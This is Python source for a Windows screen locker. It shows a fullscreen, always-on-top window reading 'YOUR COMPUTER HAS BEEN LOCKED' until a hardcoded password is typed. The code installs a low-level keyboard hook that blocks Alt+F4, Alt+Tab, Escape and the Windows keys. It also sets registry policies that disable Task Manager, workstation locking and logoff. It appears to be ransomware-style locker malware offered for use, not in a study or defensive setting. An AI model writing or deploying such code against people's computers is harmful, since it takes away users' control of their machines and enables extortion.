import tkinter as tk
import ctypes
import sys
import atexit
from ctypes import wintypes

PASSWORD = "0000"

user32 = ctypes.WinDLL("user32", use_last_error=True)

user32.SetWindowsHookExW.argtypes = [ctypes.c_int, ctypes.c_void_p,
                                      wintypes.HINSTANCE, wintypes.DWORD]
user32.SetWindowsHookExW.restype = wintypes.HHOOK
user32.CallNextHookEx.argtypes = [wintypes.HHOOK, ctypes.c_int,
                                   wintypes.WPARAM, wintypes.LPARAM]
user32.CallNextHookEx.restype = ctypes.c_long
user32.UnhookWindowsHookEx.argtypes = [wintypes.HHOOK]
user32.UnhookWindowsHookEx.restype = wintypes.BOOL

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
LLKHF_ALTDOWN = 0x20
VK_TAB = 0x09
VK_ESCAPE = 0x1B
VK_F4 = 0x73
VK_LWIN = 0x5B
VK_RWIN = 0x5C

BANNER = r"""
  ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗    ██╗      ██████╗  ██████╗██╗  ██╗
  ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║    ██║     ██╔═══██╗██╔════╝██║ ██╔╝
  ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║    ██║     ██║   ██║██║     █████╔╝
  ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║    ██║     ██║   ██║██║     ██╔═██╗
  ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║    ███████╗╚██████╔╝╚██████╗██║  ██╗
  ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝    ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
"""

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int,
                               wintypes.WPARAM, wintypes.LPARAM)


class Locker:
    def __init__(self):
        self.hook = None
        self.attempts = 0
        self._blocked_registry = False

        self.root = tk.Tk()
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.configure(bg="black")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

        frame = tk.Frame(self.root, bg="black")
        frame.pack(expand=True)

        tk.Label(frame, text=BANNER,
                 font=("Consolas", 8),
                 fg="red", bg="black", justify="left").pack(pady=(0, 20))

        tk.Label(frame, text="YOUR COMPUTER HAS BEEN LOCKED",
                 font=("Consolas", 24, "bold"),
                 fg="white", bg="black").pack(pady=(0, 10))

        self.error_label = tk.Label(frame, text="",
                                     font=("Consolas", 16),
                                     fg="red", bg="black")
        self.error_label.pack(pady=(5, 0))

        tk.Label(frame, text="Enter password to unlock.",
                 font=("Consolas", 16), fg="#888", bg="black").pack(pady=(5, 40))

        self.entry = tk.Entry(frame, font=("Consolas", 28), show="*",
                              justify="center", bg="#111", fg="#0f0",
                              insertbackground="#0f0", width=20)
        self.entry.pack(pady=10)

        tk.Button(frame, text="UNLOCK", font=("Consolas", 24),
                  command=self.check, bg="red", fg="black",
                  activebackground="#aa0000").pack(pady=20)

        self.root.bind("<Return>", self.check)

        self._hook_proc = HOOKPROC(self._hook_callback)
        atexit.register(self._cleanup)

        self._block_registry()
        self.root.after(100, self._install_hook)
        self.root.after(300, self.entry.focus_force)
        self.keep_top()

        try:
            self.root.mainloop()
        finally:
            self._cleanup()

    def _hook_callback(self, nCode, wParam, lParam):
        if nCode == 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            vk = kb.vkCode
            alt_down = bool(kb.flags & LLKHF_ALTDOWN)
            if vk == VK_F4 and alt_down: return 1
            if vk == VK_TAB and alt_down: return 1
            if vk in (VK_LWIN, VK_RWIN): return 1
            if vk == VK_ESCAPE: return 1
        return user32.CallNextHookEx(self.hook, nCode, wParam, lParam)

    def _install_hook(self):
        self.hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL,
                                              self._hook_proc, None, 0)

    def _block_registry(self):
        try:
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "NoLogoff", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            self._blocked_registry = True
        except Exception:
            pass

    def _unblock_registry(self):
        if not self._blocked_registry:
            return
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0, winreg.KEY_SET_VALUE)
            for name in ("DisableTaskMgr", "DisableLockWorkstation", "NoLogoff"):
                try:
                    winreg.DeleteValue(key, name)
                except FileNotFoundError:
                    pass
            winreg.CloseKey(key)
        except Exception:
            pass
        self._blocked_registry = False

    def _cleanup(self):
        self._unblock_registry()
        if self.hook:
            user32.UnhookWindowsHookEx(self.hook)
            self.hook = None

    def check(self, event=None):
        if self.entry.get() == PASSWORD:
            self._cleanup()
            self.root.destroy()
        else:
            self.attempts += 1
            self.error_label.config(text=f"Wrong password. Attempt {self.attempts}.")
            self.entry.delete(0, tk.END)
            self.entry.focus_force()

    def keep_top(self):
        try:
            self.root.lift()
            self.root.attributes("-topmost", True)
            self.root.after(1000, self.keep_top)
        except tk.TclError:
            pass


if __name__ == "__main__":
    Locker()
